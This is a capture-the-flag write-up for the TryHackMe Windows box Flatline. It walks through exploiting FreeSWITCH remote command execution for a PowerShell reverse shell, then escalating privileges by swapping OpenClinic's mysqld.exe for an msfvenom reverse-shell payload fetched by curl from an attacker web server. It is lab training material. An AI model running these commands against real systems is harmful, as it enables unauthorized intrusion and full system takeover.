# THM-Flatline-Write-Up
A write-up of the TryHackMe box Flatline

Level: Easy | OS: Windows

## Overview

### Skills Learned
- Identifying and leveraging known vulnerabilities in exposed services
- Exploiting remote command execution (RCE) vulnerabilities
- Crafting and deploying PowerShell reverse shells
- Navigating and enumerating a compromised Windows system
- Identifying privilege escalation vectors in misconfigured applications
- Exploiting insecure file permissions for privilege escalation

### Tools Used
- Nmap
- ExploitDB
- Netcat
- PowerShell
- msfvenom

## Initial Recon

We start with an Nmap scan of our target:

```bash
nmap -sV -sC TARGET_IP
```

This returns no results.

![Unsuccessful Nmap Scan Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Unsuccessful%20Nmap%20Screenshot.png)

Let's add the ```-Pn``` option.

```bash
nmap -sV -sC -Pn TARGET_IP
```

From the results, we can see that **port 3389 (RDP)** and **port 8021 (FreeSWITCH)** are open.

![Successful Nmap Scan Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Successful%20Nmap%20Scan%20Screenshot.png)

## Exploiting a FreeSWITCH Vulnerability

After identifying that **port 8021** is running **FreeSWITCH**, I researched known vulnerabilities and found a **command execution** exploit available on **[ExploitDB](https://www.exploit-db.com/exploits/47799)**.

Let's try it out and see if it works:

```bash
python3 /usr/share/exploitdb/exploits/windows/remote/47799.txt
```

![Unssuccesful FreeSWITCH Exploit Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Unssuccesful%20FreeSWITCH%20Exploit%20Screenshot.png)

We need to supply our target and then the command we want to run:

```bash
python3 /usr/share/exploitdb/exploits/windows/remote/47799.txt TARGET_IP whoami
```

![Succesful FreeSWITCH Exploit Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Successful%20FreeSWITCH%20Exploit%20Screenshot.png)

## Getting a Reverse Shell

It seems the exploit successfully executed the ```whoami``` command on the target, confirming that command execution is possible. Let's try and use this to get a reverse shell.

Initially, I tried using the **PowerShell #1** reverse shell from [RevShells.com](https://www.revshells.com/), which did not work. Luckily, the **PowerShell #2** reverse shell did work.

To get this to run, we will utilize **Command Substitution**

First, let's save the **PowerShell #2** reverse shell to a local file on our machine named ```reverse_shell.ps1```.

![reverse_shell.ps1 Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/reverse_shell.ps1%20Screenshot.png)

Next, let's start a Netcat listener on port 4444:

```bash
nc -lvnp 4444
```

Then we will run the exploit again:

```bash
python3 /usr/share/exploitdb/exploits/windows/remote/47799.txt 10.64.186.121 "$(cat reverse_shell.ps1)"
```

- The ```$(cat reverse_shell.ps1)``` command will read the contents of the PowerShell reverse shell script and pass it directly as an argument to the exploit.

![FreeSWITCH Exploit Reverse Shell Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/FreeSWITCH%20Exploit%20Reverse%20Shell%20Screenshot.png)

![Successful Reverse Shell Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Successful%20Reverse%20Shell%20Screenshot.png)

Our reverse shell worked, giving us an initial foothold to the system!

## User Flag

After doing some searching on the system, I found the **user.txt** flag in the **Nekrotic** user's **Desktop** directory.

```PowerShell
Get-Content user.txt
```

![User Flag Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/User%20Flag%20Screenshot.png)

There is also a root flag in this directory but we cannot access this without elevated privileges.

## Privilege Escalation

In the ```C:\``` directory, there is an interesting directory named **projects**.

![C Directory Screenshot here](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/C%20Directory%20Screenshot.png)

Within this directory, we see another directory named **openclinic**.

![Projects Directory Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Projects%20Directory%20Screenshot.png)

![Openclinic Directory Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Openclinic%20Directory%20Screenshot.png)

After some research, I found that OpenClinic is an open-source, hospital information management system.

I also found an OpenClinic **Privilege Escalation** exploit from [ExploitDB](https://www.exploit-db.com/exploits/50448)

### Exploiting an OpenClinic Vulnerability

[ExploitDB](https://www.exploit-db.com/exploits/50448) states, "*any low privilege user can escalate their privileges by abusing the MariaDB service in OpenClinic. A low privilege account is able to rename mysqld.exe or tomcat8.exe files located in bin folders and replace them with a malicious file that would connect back to an attacking computer, giving system level privileges.*"

[ExploitDB](https://www.exploit-db.com/exploits/50448) gives us the following proof of concept steps to exploit this vulnerability:

![OpenClinic PoC Steps Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/OpenClinic%20PoC%20Steps%20Screenshot.png)

Let's first generate our payload and store it in a directory that will later be hosted as a local web server:

```bash
mkdir web-server
cd web-server
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4242 -f exe > mysqld_evil.exe
```

![Generating Payload Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Generating%20Payload%20Screenshot.png)

Let's serve this malicious executable on a web server:

```bash
cd web-server
python3 -m http.server 8080
```

![Web Server Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Web%20Server%20Screenshot.png)

On the victim machine, we need to download the malicious executable to the ```C:\projects\openclinic\mariadb\bin\``` directory:

```
curl http://YOUR_IP:8080/mysqld_evil.exe -o "C:\projects\openclinic\mariadb\bin\mysqld_evil.exe"
```

Let's confirm:

```
dir
```

![Downloading Malicious Executable Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Downloading%20Malicious%20Executable%20Screenshot.png)

![Confirm Malicious Executable Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Confirm%20Malicious%20Executable%20Screenshot.png)

Now we need to rename the real mysqld.exe to mysqld.bak:

```PowerShell
Move-Item mysqld.exe mysqld.bak
```

![Rename Real mysqld Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Rename%20Real%20mysqld%20Screenshot.png)

Let's confirm the rename:

```
dir
```

![Confirm mysqld Rename Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Confirm%20mysqld%20Rename%20Screenshot.png)

Now we need to rename the malicious mysqld_evil.exe to mysqld.exe:

```PowerShell
Move-Item mysqld_evil.exe mysqld.exe
```

![Rename Malicious mysqld Screenshot here](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Rename%20Malicious%20mysqld%20Screenshot.png)

Let's confirm the rename:

```
dir
```

![Confirm Rename Malicious mysqld Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Confirm%20Rename%20Malicious%20mysqld%20Screenshot.png)

Let's start our Netcat Listener:

```bash
nc -lvnp 4242
```

Now we need to restart the machine for our malicious executable to work:

```PowerShell
Restart-Computer
```

![Restart Computer Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Restart%20Computer%20Screenshot.png)

After a few minutes, we have a reverse shell with system level privileges!

![System Level Reverse Shell Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/System%20Level%20Reverse%20Shell%20Screenshot.png)

## Root Flag

Now with system level privileges, we can extract our root flag.

For some reason, ```Get-Content``` does not work like it did with the user flag. We will have to use the ```type``` command to get the root flag:

```
type root.txt
```

![Root Flag Screenshot](https://github.com/Cyb3rTripp/THM-Flatline-Write-Up/blob/main/Screenshots/Root%20Flag%20Screenshot.png)
